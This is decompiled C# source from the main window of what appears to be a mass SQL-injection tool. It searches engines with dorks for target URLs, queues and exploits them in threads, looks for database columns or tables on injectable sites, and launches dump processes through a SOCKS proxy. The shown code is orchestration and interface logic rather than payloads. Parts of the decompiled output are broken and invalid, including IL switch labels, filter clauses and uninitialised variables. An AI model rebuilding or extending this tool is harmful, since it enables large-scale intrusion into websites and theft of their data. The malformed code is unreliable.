	// Token: 0x06000EA6 RID: 3750
	[DllImport("user32.dll")]
	private static extern bool IsIconic(IntPtr intptr_0);

	// Token: 0x06000EA7 RID: 3751 RVA: 0x0005A008 File Offset: 0x00058208
	private bool method_7()
	{
		string processName = Process.GetCurrentProcess().ProcessName;
		Process[] processesByName = Process.GetProcessesByName(processName);
		Process currentProcess = Process.GetCurrentProcess();
		foreach (Process process in processesByName)
		{
			if (currentProcess.Id != process.Id)
			{
				IntPtr mainWindowHandle = process.MainWindowHandle;
				if (!(!process.MainWindowTitle.StartsWith(global::Globals.APP_VERSION) | string.IsNullOrEmpty(process.MainWindowTitle)) && process.MainModule.FileName.Equals(currentProcess.MainModule.FileName))
				{
					if (MainForm.IsIconic(mainWindowHandle))
					{
						MainForm.ShowWindowAsync(mainWindowHandle, 9);
					}
					MainForm.SetForegroundWindow(mainWindowHandle);
					Process.GetCurrentProcess().Kill();
					return true;
				}
			}
		}
		return false;
	}

	// Token: 0x06000EA8 RID: 3752 RVA: 0x0005A0DC File Offset: 0x000582DC
	private void method_8()
	{
		try
		{
			global::Globals.COMMAND_LINE_ARGS = Environment.GetCommandLineArgs();
			global::Globals.IS_DUMP_INSTANCE = (global::Globals.COMMAND_LINE_ARGS.Length > 2);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000EA9 RID: 3753 RVA: 0x0005A124 File Offset: 0x00058324
	internal void method_9(string string_5, string string_6, List<string> list_3 = null)
	{
		try
		{
			if (list_3 == null)
			{
				list_3 = new List<string>();
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = Application.ExecutablePath;
			processStartInfo.Arguments = "\"" + string_5 + "\"";
			ProcessStartInfo processStartInfo2;
			(processStartInfo2 = processStartInfo).Arguments = processStartInfo2.Arguments + " \"" + string_6 + "\"";
			if (list_3 != null)
			{
				try
				{
					foreach (string text in list_3)
					{
						try
						{
							if (text.Contains(" "))
							{
								text = text.Substring(text.LastIndexOf(" ")).Trim();
							}
							goto IL_F5;
						}
						catch (Exception ex)
						{
							goto IL_F5;
						}
						IL_AE:
						string[] array;
						(processStartInfo2 = processStartInfo).Arguments = string.Concat(new string[]
						{
							processStartInfo2.Arguments,
							" \"",
							array[0],
							".",
							array[1],
							"\""
						});
						continue;
						IL_F5:
						array = Strings.Split(text, ".", -1, CompareMethod.Binary);
						if (array.Length > 1)
						{
							goto IL_AE;
						}
					}
				}
				finally
				{
					List<string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			Process.Start(processStartInfo);
			global::Globals.G_SOCKS.method_15();
		}
		catch (Exception ex2)
		{
			MessageBox.Show(ex2.Message);
		}
	}

	// Token: 0x06000EAA RID: 3754 RVA: 0x0005A2D0 File Offset: 0x000584D0
	private void method_10(object sender, EventArgs e)
	{
		if (this.bool_3)
		{
			if (this.uxTabControl_0.SelectedIndex == 0)
			{
				this.enum6_0 = MainForm.Enum6.const_1;
			}
			else if (this.uxTabControl_0.SelectedIndex == 1 | this.uxTabControl_0.SelectedIndex == 2)
			{
				if (this.dtgQueue.RowCount == 0)
				{
					if (!this.method_20())
					{
						return;
					}
					this.enum6_0 = MainForm.Enum6.const_3;
				}
				else
				{
					this.enum6_0 = MainForm.Enum6.const_2;
				}
			}
			else
			{
				Interaction.Beep();
			}
		}
		else if (this.twMain.SelectedNode.Text.Equals(this.treeNode_0.Text))
		{
			this.enum6_0 = MainForm.Enum6.const_1;
		}
		else if (this.twMain.SelectedNode.Text.Equals(this.treeNode_4.Text) | this.twMain.SelectedNode.Text.Equals(this.treeNode_1.Text))
		{
			if (this.dtgQueue.RowCount == 0)
			{
				if (!this.method_20())
				{
					return;
				}
				this.enum6_0 = MainForm.Enum6.const_3;
			}
			else
			{
				this.enum6_0 = MainForm.Enum6.const_2;
			}
		}
		else
		{
			Interaction.Beep();
		}
		this.method_16();
	}

	// Token: 0x06000EAB RID: 3755 RVA: 0x0005A400 File Offset: 0x00058600
	private void method_11(object sender, EventArgs e)
	{
		this.btnPause.Checked = false;
		this.btnPause.Enabled = false;
		this.btnStop.Enabled = false;
		this.bcWorker.CancelAsync();
		if (this.enum6_0 != MainForm.Enum6.const_1)
		{
			this.AppControlDomain.Abort();
		}
		this.method_22(0);
		global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Indeterminate);
		if (this.enum6_0 == MainForm.Enum6.const_1)
		{
			try
			{
				foreach (SearchEngine searchEngine in this.dictionary_0.Values)
				{
					searchEngine.StopScanning();
				}
			}
			finally
			{
				Dictionary<global::Globals.SearchHost, SearchEngine>.ValueCollection.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
		}
		if (this.threadPool_0 != null)
		{
			this.threadPool_0.AbortThreads();
		}
	}

	// Token: 0x06000EAC RID: 3756 RVA: 0x0000805A File Offset: 0x0000625A
	private void method_12(object sender, EventArgs e)
	{
		this.enum6_0 = MainForm.Enum6.const_4;
		this.method_16();
	}

	// Token: 0x06000EAD RID: 3757 RVA: 0x00008069 File Offset: 0x00006269
	private void method_13(object sender, EventArgs e)
	{
		this.btnSearchColumnPause.Checked = false;
		this.btnSearchColumnPause.Enabled = false;
		this.btnSearchColumnStop.Enabled = false;
		this.bcWorker.CancelAsync();
		this.AppControlDomain.Abort();
	}

	// Token: 0x06000EAE RID: 3758 RVA: 0x0005A4D4 File Offset: 0x000586D4
	private void method_14(object sender, EventArgs e)
	{
		this.ReExploiterForm = new ReExploiter();
		this.ReExploiterForm.FormBorderStyle = FormBorderStyle.FixedToolWindow;
		checked
		{
			this.ReExploiterForm.Size = new Size(250, this.ReExploiterForm.tsWorker.Size.Height + 30);
			this.ReExploiterForm.Top = (int)Math.Round(unchecked((double)global::Globals.GMain.Top + (double)global::Globals.GMain.Height / 2.0 - (double)this.ReExploiterForm.Height / 2.0));
			this.ReExploiterForm.Left = (int)Math.Round(unchecked((double)global::Globals.GMain.Left + (double)global::Globals.GMain.Width / 2.0 - (double)this.ReExploiterForm.Width / 2.0));
			if (this.dtgSQLi.SelectedRows.Count > 1)
			{
				this.ReExploiterForm.ShowDialog(this);
			}
			else
			{
				this.enum6_0 = MainForm.Enum6.const_5;
				this.method_16();
			}
		}
	}

	// Token: 0x06000EAF RID: 3759 RVA: 0x000080A5 File Offset: 0x000062A5
	internal void method_15()
	{
		this.enum6_0 = MainForm.Enum6.const_5;
		this.ReExploiterForm.Hide();
		this.method_16();
	}

	// Token: 0x170004E6 RID: 1254
	// (get) Token: 0x06000EB0 RID: 3760 RVA: 0x0005A5EC File Offset: 0x000587EC
	internal AppDomainControl AppDomainControl_0
	{
		get
		{
			return this.AppControlDomain;
		}
	}

	// Token: 0x170004E7 RID: 1255
	// (get) Token: 0x06000EB1 RID: 3761 RVA: 0x000080BF File Offset: 0x000062BF
	internal bool Boolean_0
	{
		get
		{
			return this.enum6_0 == MainForm.Enum6.const_4;
		}
	}

	// Token: 0x170004E8 RID: 1256
	// (get) Token: 0x06000EB2 RID: 3762 RVA: 0x000080CA File Offset: 0x000062CA
	internal bool Boolean_1
	{
		get
		{
			return this.enum6_0 > MainForm.Enum6.const_0;
		}
	}

	// Token: 0x170004E9 RID: 1257
	// (get) Token: 0x06000EB3 RID: 3763 RVA: 0x0005A604 File Offset: 0x00058804
	internal int Int32_0
	{
		get
		{
			int result;
			if (this.threadPool_0 != null)
			{
				result = this.threadPool_0.ThreadCount;
			}
			else
			{
				result = 0;
			}
			return result;
		}
	}

	// Token: 0x170004EA RID: 1258
	// (get) Token: 0x06000EB4 RID: 3764 RVA: 0x0005A630 File Offset: 0x00058830
	internal int Int32_1
	{
		get
		{
			int result;
			if (this.enum6_0 == MainForm.Enum6.const_3 | this.enum6_0 == MainForm.Enum6.const_2 | this.enum6_0 == MainForm.Enum6.const_5)
			{
				result = ((-((!this.bcWorker.CancellationPending > false) ? 1 : 0)) ? 1 : 0);
			}
			return result;
		}
	}

	// Token: 0x170004EB RID: 1259
	// (get) Token: 0x06000EB5 RID: 3765 RVA: 0x0005A670 File Offset: 0x00058870
	internal int Int32_2
	{
		get
		{
			int result;
			if (this.enum6_0 == MainForm.Enum6.const_1)
			{
				result = ((-((!this.bcWorker.CancellationPending > false) ? 1 : 0)) ? 1 : 0);
			}
			return result;
		}
	}

	// Token: 0x06000EB6 RID: 3766 RVA: 0x0005A69C File Offset: 0x0005889C
	private void method_16()
	{
		checked
		{
			try
			{
				this.btnPause.Checked = false;
				this.btnSearchColumnPause.Checked = false;
				if (this.enum6_0 == MainForm.Enum6.const_1)
				{
					this.dictionary_0 = new Dictionary<global::Globals.SearchHost, SearchEngine>();
					this.list_0 = new List<string>();
					int num = this.lstSearchEngine.Items.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (this.lstSearchEngine.GetItemChecked(i))
						{
							global::Globals.SearchHost searchHost = (global::Globals.SearchHost)Conversions.ToByte(this.lstSearchEngine.Items[i]);
							this.dictionary_0.Add(searchHost, new SearchEngine((byte)searchHost, null));
						}
					}
					if (this.dictionary_0.Count == 0)
					{
						this.method_1(global::Globals.translate_0.GetStr(this, 3, ""));
						this.lstSearchEngine.Focus();
						this.enum6_0 = MainForm.Enum6.const_0;
						Interaction.Beep();
						return;
					}
					foreach (string text in this.txtMultiDorks.Lines)
					{
						if (!string.IsNullOrEmpty(text) && !this.list_0.Contains(text))
						{
							this.list_0.Add(text);
						}
					}
					if (this.list_0.Count == 0)
					{
						this.method_1(global::Globals.translate_0.GetStr(this, 4, ""));
						this.txtMultiDorks.Focus();
						this.enum6_0 = MainForm.Enum6.const_0;
						Interaction.Beep();
						return;
					}
					global::Globals.GQueue.method_12();
				}
				else if (this.enum6_0 == MainForm.Enum6.const_4)
				{
					this.list_1 = new List<string>();
					if (this.chkSearchColumn.Checked)
					{
						string text2 = this.cmbSearchColumn.Text.Trim();
						if (!string.IsNullOrEmpty(text2) & !this.list_1.Contains(text2))
						{
							this.list_1.Add(text2);
						}
					}
					if (this.chkSearchColumn2.Checked)
					{
						string text2 = this.cmbSearchColumn2.Text.Trim();
						if (!string.IsNullOrEmpty(text2) & !this.list_1.Contains(text2))
						{
							this.list_1.Add(text2);
						}
					}
					if (this.chkSearchColumn3.Checked)
					{
						string text2 = this.cmbSearchColumn3.Text.Trim();
						if (!string.IsNullOrEmpty(text2) & !this.list_1.Contains(text2))
						{
							this.list_1.Add(text2);
						}
					}
					if (this.chkSearchColumn4.Checked)
					{
						string text2 = this.cmbSearchColumn4.Text.Trim();
						if (!string.IsNullOrEmpty(text2) & !this.list_1.Contains(text2))
						{
							this.list_1.Add(text2);
						}
					}
					if (this.list_1.Count == 0)
					{
						this.method_1(global::Globals.translate_0.GetStr(this, 5, ""));
						this.cmbSearchColumn.Focus();
						this.enum6_0 = MainForm.Enum6.const_0;
						Interaction.Beep();
						return;
					}
					this.list_2 = new List<DataGridViewRow>();
					try
					{
						foreach (object obj in this.dtgSQLi.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							Class54.smethod_6(Conversions.ToString(dataGridViewRow.Cells[2].Value));
							this.list_2.Add(dataGridViewRow);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					if (this.list_2.Count == 0)
					{
						this.method_1(global::Globals.translate_0.GetStr(this, 6, ""));
						this.dtgSQLi.Focus();
						this.enum6_0 = MainForm.Enum6.const_0;
						Interaction.Beep();
						return;
					}
					this.checkSearchType_0 = ((this.cmbSearchColumnType.SelectedIndex == 0) ? MainForm.CheckSearchType.Columns : MainForm.CheckSearchType.Tables);
					this.searchColumn_0 = new SearchColumn(true, this.dtgSQLi);
					this.searchColumn_0.Text = string.Concat(new string[]
					{
						global::Globals.translate_0.GetStr(this, 7, ""),
						" ",
						(this.cmbSearchColumnType.SelectedIndex == 0) ? global::Globals.translate_0.GetStr(this, 8, "") : global::Globals.translate_0.GetStr(this, 9, ""),
						" ",
						this.chkSearchColumn.Checked ? this.cmbSearchColumn.Text : "",
						" ",
						(this.chkSearchColumn2.Checked ? this.cmbSearchColumn2.Text : "").Replace("  ", " "),
						(this.chkSearchColumn3.Checked ? this.cmbSearchColumn3.Text : "").Replace("  ", " "),
						(this.chkSearchColumn4.Checked ? this.cmbSearchColumn4.Text : "").Replace("  ", " ")
					});
					this.searchColumn_0.Show(this);
					this.searchColumn_0.Visible = false;
				}
				else if (this.enum6_0 == MainForm.Enum6.const_2 | this.enum6_0 == MainForm.Enum6.const_3)
				{
					this.struct10_0 = default(MainForm.Struct10);
				}
				else
				{
					if (this.enum6_0 != MainForm.Enum6.const_5)
					{
						throw new Exception("StartWorker?");
					}
					this.list_2 = new List<DataGridViewRow>();
					try
					{
						foreach (object obj2 in this.dtgSQLi.SelectedRows)
						{
							DataGridViewRow dataGridViewRow2 = (DataGridViewRow)obj2;
							Types types_ = Class54.smethod_6(Conversions.ToString(dataGridViewRow2.Cells[2].Value));
							if (Class54.smethod_9(types_) | Class54.smethod_10(types_))
							{
								this.list_2.Add(dataGridViewRow2);
							}
						}
					}
					finally
					{
						IEnumerator enumerator2;
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
					if (this.list_2.Count == 0)
					{
						this.method_1("Select Items");
						this.dtgSQLi.Focus();
						this.enum6_0 = MainForm.Enum6.const_0;
						Interaction.Beep();
						return;
					}
					this.struct10_0 = default(MainForm.Struct10);
				}
				this.method_18(false);
				this.bcWorker.RunWorkerAsync();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
	}

	// Token: 0x06000EB7 RID: 3767 RVA: 0x000080D5 File Offset: 0x000062D5
	private void method_17(string string_5)
	{
		this.method_1(string_5);
		this.method_18(true);
		this.dictionary_0 = null;
		this.list_0 = null;
		this.threadPool_0 = null;
		this.enum6_0 = MainForm.Enum6.const_0;
		this.smethod_6(null, null);
	}

	// Token: 0x06000EB8 RID: 3768 RVA: 0x0005AD68 File Offset: 0x00058F68
	private void method_18(bool bool_5)
	{
		global::Globals.LockWindowUpdate(base.Handle);
		this.btnStart.Visible = bool_5;
		this.btnPause.Visible = !bool_5;
		this.btnPauseSP.Visible = !bool_5;
		this.btnStop.Visible = !bool_5;
		this.btnStart.Enabled = bool_5;
		this.btnPause.Enabled = !bool_5;
		this.btnStop.Enabled = !bool_5;
		global::Globals.G_Taskbar.SetProgressValue(0, 100);
		if (bool_5)
		{
			global::Globals.G_Taskbar.SetProgressState(ProgressBarState.NoProgress);
		}
		else
		{
			global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
		}
		checked
		{
			if (this.enum6_0 == MainForm.Enum6.const_1)
			{
				this.lblSearchSummary_1.Visible = !bool_5;
				this.lblSearchSummary_2.Visible = !bool_5;
				this.txtMultiDorks.Visible = bool_5;
				this.lstSearchEngine.Visible = bool_5;
				if (bool_5)
				{
					GroupBox grbDorks;
					(grbDorks = this.grbDorks).Height = grbDorks.Height + 25;
				}
				else
				{
					GroupBox grbDorks;
					(grbDorks = this.grbDorks).Height = grbDorks.Height - 25;
				}
				this.btnSearchFilter.Enabled = bool_5;
				this.txtSearchFilter.Enabled = (bool_5 & this.btnSearchFilter.Checked);
			}
			if (this.enum6_0 == MainForm.Enum6.const_4)
			{
				this.prbSearchColumn.Value = 0;
				this.prbSearchColumn.Visible = !bool_5;
				this.prbSearchColumn.Style = ProgressBarStyle.Blocks;
				this.chkSearchColumn.Enabled = bool_5;
				this.chkSearchColumn2.Enabled = bool_5;
				this.chkSearchColumn3.Enabled = bool_5;
				this.chkSearchColumn4.Enabled = bool_5;
				this.cmbSearchColumn.Enabled = bool_5;
				this.cmbSearchColumn2.Enabled = bool_5;
				this.cmbSearchColumn3.Enabled = bool_5;
				this.cmbSearchColumn4.Enabled = bool_5;
				this.cmbSearchColumnType.Enabled = bool_5;
				this.chkSearchColumnAllDBs.Enabled = bool_5;
				this.btnSearchColumnStart.Enabled = (bool_5 & this.dtgSQLi.SelectedRows.Count > 0);
				this.btnSearchColumnStart.Visible = bool_5;
				this.btnSearchColumnPause.Visible = !bool_5;
				this.btnSearchColumnSP.Visible = !bool_5;
				this.btnSearchColumnStop.Visible = !bool_5;
				this.btnSearchColumnStop.Enabled = !bool_5;
				this.btnSearchColumnPause.Enabled = !bool_5;
				this.tsWorker.Visible = bool_5;
				if (bool_5)
				{
					global::Globals.GMain.Controls.Remove(this.tsSearchColumn);
					this.pnlSQLi.Controls.Add(this.tsSearchColumn);
				}
				else
				{
					this.pnlSQLi.Controls.Remove(this.tsSearchColumn);
					global::Globals.GMain.Controls.Add(this.tsSearchColumn);
				}
				this.stMain.SendToBack();
			}
			else
			{
				this.prbMainStatus.Value = 0;
				this.prbMainStatus.Visible = !bool_5;
				this.prbMainStatus.Style = ProgressBarStyle.Blocks;
				this.tsSearchColumn.Visible = bool_5;
			}
			this.btnSettingReset.Enabled = bool_5;
			this.btnSettingReLoad.Enabled = bool_5;
			global::Globals.LockWindowUpdate(IntPtr.Zero);
		}
	}

	// Token: 0x06000EB9 RID: 3769 RVA: 0x0005B094 File Offset: 0x00059294
	private void method_19()
	{
		this.string_0 = Class50.smethod_5(base.Name, "URL_List_Path", "", null);
		this.int_0 = Conversions.ToInteger(Class50.smethod_5(base.Name, "URL_List_Line", "1", null));
		if (this.int_0 > 1)
		{
			if (File.Exists(this.string_0))
			{
				using (new Class8(this))
				{
					if (MessageBox.Show(string.Concat(new string[]
					{
						"It looks like the previous exploithing text file crashed: \r\n",
						this.string_0,
						"\r\n\r\nWorking on line index: ",
						global::Globals.FormatNumbers(this.int_0, true),
						"\r\n\r\nDo you want to continue to work?"
					}), "Confirme", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1) == DialogResult.Yes)
					{
						this.twMain.SelectedNode = this.treeNode_4;
						this.method_10(null, null);
					}
				}
			}
			Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(0), null);
		}
	}

	// Token: 0x06000EBA RID: 3770 RVA: 0x0005B19C File Offset: 0x0005939C
	private bool method_20()
	{
		this.string_0 = Class50.smethod_5(base.Name, "URL_List_Path", "", null);
		this.int_0 = Conversions.ToInteger(Class50.smethod_5(base.Name, "URL_List_Line", "1", null));
		string text = "";
		string text2 = "";
		if (!string.IsNullOrEmpty(this.string_0))
		{
			text = Path.GetDirectoryName(this.string_0);
			if (Directory.Exists(text))
			{
				if (File.Exists(this.string_0))
				{
					text2 = Path.GetFileName(this.string_0);
				}
				else
				{
					this.int_0 = 1;
				}
			}
			else
			{
				text = "";
				this.int_0 = 1;
			}
		}
		else
		{
			this.int_0 = 1;
		}
		using (OpenFileDialog openFileDialog = new OpenFileDialog())
		{
			if (Directory.Exists(text))
			{
				openFileDialog.InitialDirectory = text;
			}
			else
			{
				openFileDialog.InitialDirectory = global::Globals.APP_PATH;
			}
			if (!string.IsNullOrEmpty(text2))
			{
				openFileDialog.FileName = text2;
			}
			openFileDialog.Title = global::Globals.translate_0.GetStr(this, 14, "");
			openFileDialog.Multiselect = false;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return false;
			}
			this.string_0 = openFileDialog.FileName;
			Class50.smethod_4(base.Name, "URL_List_Path", openFileDialog.FileName, null);
		}
		this.method_1(global::Globals.translate_0.GetStr(this, 13, "") + this.string_0);
		Application.DoEvents();
		this.int_4 = this.method_86(this.string_0);
		this.method_1("");
		string text3 = string.Concat(new string[]
		{
			"File: ",
			this.string_0,
			"\r\nLines Count: ",
			global::Globals.FormatNumbers(this.int_4, true),
			"\r\n\r\nFirt 1k Lines: \r\n",
			this.method_87(this.string_0, 10000)
		});
		checked
		{
			bool result;
			using (OpenFilePreview openFilePreview = new OpenFilePreview())
			{
				openFilePreview.Text = global::Globals.translate_0.GetStr(this, 15, "");
				openFilePreview.txtPreview.Text = text3;
				openFilePreview.numLineIndex.Maximum = new decimal(this.int_4 - 1);
				if (this.int_0 > 0 & this.int_0 < this.int_4 - 1)
				{
					openFilePreview.numLineIndex.Value = new decimal(this.int_0);
				}
				if (openFilePreview.ShowDialog(this) == DialogResult.OK)
				{
					this.int_0 = Convert.ToInt32(openFilePreview.numLineIndex.Value);
					result = true;
				}
				else
				{
					result = false;
				}
			}
			return result;
		}
	}

	// Token: 0x06000EBB RID: 3771 RVA: 0x0005B454 File Offset: 0x00059654
	internal MainForm.Enum6 method_21()
	{
		return this.enum6_0;
	}

	// Token: 0x06000EBC RID: 3772 RVA: 0x0005B46C File Offset: 0x0005966C
	private bool method_22(int int_14 = -1)
	{
		bool result;
		if (base.InvokeRequired)
		{
			result = Conversions.ToBoolean(base.Invoke(new MainForm.Delegate45(this.method_214)));
		}
		else if (this.enum6_0 == MainForm.Enum6.const_4)
		{
			if (int_14 != 0)
			{
				if (int_14 == 1)
				{
					this.btnSearchColumnPause.Checked = true;
				}
			}
			else
			{
				this.btnSearchColumnPause.Checked = false;
			}
			result = (this.btnSearchColumnPause.Checked & !this.bcWorker.CancellationPending);
		}
		else
		{
			if (int_14 != 0)
			{
				if (int_14 == 1)
				{
					this.btnPause.Checked = true;
				}
			}
			else
			{
				this.btnPause.Checked = false;
			}
			result = (this.btnPause.Checked & !(this.bcWorker.CancellationPending | !global::Globals.NETWORK_AVAILABLE));
		}
		return result;
	}

	// Token: 0x06000EBD RID: 3773 RVA: 0x0005B538 File Offset: 0x00059738
	internal bool method_23()
	{
		bool result;
		if (this.threadPool_0 != null && this.threadPool_0.Status == global::ThreadPool.ThreadStatus.Stopped)
		{
			result = true;
		}
		else if (this.enum6_0 == MainForm.Enum6.const_0)
		{
			result = true;
		}
		else
		{
			if (this.method_22(-1))
			{
				if (this.$STATIC$PausedOrCanceled$2002$bPauseControl$Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$PausedOrCanceled$2002$bPauseControl$Init, new StaticLocalInitFlag(), null);
				}
				bool flag = false;
				try
				{
					Monitor.Enter(this.$STATIC$PausedOrCanceled$2002$bPauseControl$Init, ref flag);
					if (this.$STATIC$PausedOrCanceled$2002$bPauseControl$Init.State == 0)
					{
						this.$STATIC$PausedOrCanceled$2002$bPauseControl$Init.State = 2;
						this.$STATIC$PausedOrCanceled$2002$bPauseControl = false;
					}
					else if (this.$STATIC$PausedOrCanceled$2002$bPauseControl$Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					this.$STATIC$PausedOrCanceled$2002$bPauseControl$Init.State = 1;
					if (flag)
					{
						Monitor.Exit(this.$STATIC$PausedOrCanceled$2002$bPauseControl$Init);
					}
				}
				if (this.$STATIC$PausedOrCanceled$2002$bPauseControl)
				{
					while (this.method_22(-1))
					{
						Thread.Sleep(10);
						Application.DoEvents();
					}
					this.$STATIC$PausedOrCanceled$2002$bPauseControl = false;
				}
				else
				{
					this.$STATIC$PausedOrCanceled$2002$bPauseControl = true;
					if (this.enum6_0 == MainForm.Enum6.const_1)
					{
						try
						{
							foreach (SearchEngine searchEngine in this.dictionary_0.Values)
							{
								searchEngine.PauseScanning(true);
							}
						}
						finally
						{
							Dictionary<global::Globals.SearchHost, SearchEngine>.ValueCollection.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
					}
					if (this.threadPool_0 != null)
					{
						this.threadPool_0.Paused = true;
					}
					global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Paused);
					while (this.method_22(-1))
					{
						Thread.Sleep(10);
						Application.DoEvents();
					}
					if (this.threadPool_0 != null)
					{
						this.threadPool_0.Paused = false;
					}
					global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
					if (this.enum6_0 == MainForm.Enum6.const_1)
					{
						try
						{
							foreach (SearchEngine searchEngine2 in this.dictionary_0.Values)
							{
								searchEngine2.PauseScanning(false);
							}
						}
						finally
						{
							Dictionary<global::Globals.SearchHost, SearchEngine>.ValueCollection.Enumerator enumerator2;
							((IDisposable)enumerator2).Dispose();
						}
					}
					if (this.enum6_0 != MainForm.Enum6.const_1)
					{
					}
				}
			}
			result = this.bcWorker.CancellationPending;
		}
		return result;
	}

	// Token: 0x06000EBE RID: 3774 RVA: 0x0005B760 File Offset: 0x00059960
	private void method_24(Exception exception_0)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			if (!Debugger.IsAttached)
			{
				goto IL_4F;
			}
			IL_13:
			num2 = 3;
			if (!this.Boolean_1)
			{
				goto IL_4F;
			}
			IL_1D:
			num2 = 4;
			if (exception_0 is ThreadAbortException)
			{
				goto IL_4F;
			}
			IL_2D:
			num2 = 5;
			if (this.bcWorker.CancellationPending)
			{
				goto IL_4F;
			}
			IL_3F:
			num2 = 6;
			Interaction.MsgBox(exception_0.ToString(), MsgBoxStyle.OkOnly, null);
			IL_4F:
			goto IL_D5;
			IL_54:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_8E:
			goto IL_CA;
			IL_90:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_A8:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_90;
		}
		IL_CA:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_D5:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000EBF RID: 3775 RVA: 0x0005B85C File Offset: 0x00059A5C
	private string[] method_25()
	{
		string[] result;
		if (this.dtgQueue.InvokeRequired)
		{
			result = (string[])this.dtgQueue.Invoke(new MainForm.Delegate46(this.method_25));
		}
		else
		{
			List<string> list = new List<string>();
			try
			{
				foreach (object obj in ((IEnumerable)this.dtgQueue.Rows))
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					list.Add(Conversions.ToString(dataGridViewRow.Cells[0].Value));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			result = list.ToArray();
		}
		return result;
	}

	// Token: 0x06000EC0 RID: 3776 RVA: 0x0005B90C File Offset: 0x00059B0C
	private void method_26(object sender, DoWorkEventArgs e)
	{
		checked
		{
			try
			{
				if (this.enum6_0 != MainForm.Enum6.const_1)
				{
					this.AppControlDomain = new AppDomainControl();
				}
				if (this.enum6_0 == MainForm.Enum6.const_1)
				{
					try
					{
						foreach (global::Globals.SearchHost searchHost in this.dictionary_0.Keys)
						{
							new Thread(new ParameterizedThreadStart(this.method_215))
							{
								IsBackground = true
							}.Start(searchHost);
						}
						goto IL_97;
					}
					finally
					{
						Dictionary<global::Globals.SearchHost, SearchEngine>.KeyCollection.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					IL_82:
					if (this.method_23())
					{
						goto IL_C35;
					}
					Thread.Sleep(2000);
					IL_97:
					this.method_32();
					if (!this.method_31())
					{
						goto IL_82;
					}
				}
				else if (this.enum6_0 == MainForm.Enum6.const_2)
				{
					this.method_1(global::Globals.translate_0.GetStr(this, 17, ""));
					int num = this.int_2;
					string[] array = this.method_25();
					if (num > array.Length)
					{
						num = array.Length;
					}
					this.threadPool_0 = new global::ThreadPool(num);
					if (array.Length == 1)
					{
						this.method_29(ProgressBarStyle.Marquee);
					}
					int num2 = array.Length - 1;
					this.int_0 = 0;
					while (this.int_0 <= num2)
					{
						if (this.method_23())
						{
							this.threadPool_0.AbortThreads();
							break;
						}
						this.int_1 = (int)Math.Round(Math.Round((double)(100 * (this.int_0 + 1)) / (double)(array.Length + this.threadPool_0.ThreadCount)));
						this.bcWorker.ReportProgress(this.int_1);
						if (array.Length > 1)
						{
							this.method_1(string.Concat(new string[]
							{
								"[",
								global::Globals.FormatNumbers(this.int_0 + 1, true),
								" | ",
								global::Globals.FormatNumbers(array.Length, true),
								"] ",
								Conversions.ToString(this.int_1),
								"% ",
								global::Globals.translate_0.GetStr(this, 18, ""),
								" ",
								this.struct10_0.method_0()
							}));
						}
						else
						{
							this.method_1(global::Globals.translate_0.GetStr(this, 18, "") + " " + this.struct10_0.method_0());
						}
						try
						{
							Class25 @class = new Class25();
							@class.String_0 = array[this.int_0];
							Thread thread = new Thread(new ParameterizedThreadStart(this.method_216));
							thread.Name = "Pos : " + Conversions.ToString(this.int_0);
							@class.Thread = thread;
							@class.Index = this.int_0;
							thread.Start(@class);
							this.threadPool_0.Open(thread);
							this.threadPool_0.WaitForThreads();
						}
						catch (Exception ex)
						{
						}
						Thread.Sleep(50);
						this.int_0++;
					}
				}
				else if (this.enum6_0 == MainForm.Enum6.const_3)
				{
					int num3 = this.int_2;
					if (num3 > this.int_4)
					{
						num3 = this.int_4;
					}
					this.threadPool_0 = new global::ThreadPool(num3);
					FileInfo fileInfo = new FileInfo(this.string_0);
					int num4 = 0;
					using (StreamReader streamReader = fileInfo.OpenText())
					{
						while (!streamReader.EndOfStream)
						{
							if (num4 < this.int_0)
							{
								if (num4 % 10000 == 0)
								{
									this.method_1(global::Globals.translate_0.GetStr(this, 19, "") + " " + global::Globals.FormatNumbers(num4 - this.int_0, true));
									if (this.method_23())
									{
										break;
									}
								}
								streamReader.ReadLine();
								num4++;
							}
							else
							{
								string str = streamReader.ReadLine();
								if (this.method_23())
								{
									this.threadPool_0.AbortThreads();
									streamReader.Close();
									break;
								}
								if (Class23.smethod_13(str, true) && !global::Globals.GTrash.method_2(str))
								{
									if (this.int_4 > 1)
									{
